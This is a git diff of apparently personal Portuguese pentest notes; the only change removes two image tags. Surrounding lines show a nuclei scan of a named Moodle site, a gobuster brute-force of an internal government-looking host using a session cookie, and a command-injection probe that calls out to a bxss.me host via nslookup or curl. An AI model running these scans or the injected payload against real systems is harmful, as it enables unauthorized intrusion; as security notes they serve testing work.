@@ -24,9 +24,6 @@ nuclei -u https://cursos.rizomasur.org -tags moodle
 gobuster dir -u https://app.homolog.itamaraty.local/GestaoFinanceira/Pages/Dashboard/   -w /usr/share/wordlists/dirb/common.txt   -t 50   -H 'Host: app.homolog.itamaraty.local'   -H 'Cookie: ASP.NET_SessionId=whvgzv2plsyzvnglugu2kxyc; outro_cookie=valor'   -k -x html,php,js,aspx,bat,txt,zip
 
 - ;(nslookup -q=cname hitvvbmacavlf462a1.bxss.me||curl hitvvbmacav  (passar em alguns headers)
-  <img width="265" height="238" alt="image" src="https://github.com/user-attachments/assets/5ec6aab3-0e33-4fb5-b94e-42f2c5143f1f" />
-  <img width="201" height="213" alt="image" src="https://github.com/user-attachments/assets/2be4433b-e94d-48cb-8053-35259838100e" />
-
 
 
 - https://github.com/santoru/shcheck -> ver se tem alguns headers vulneraveis
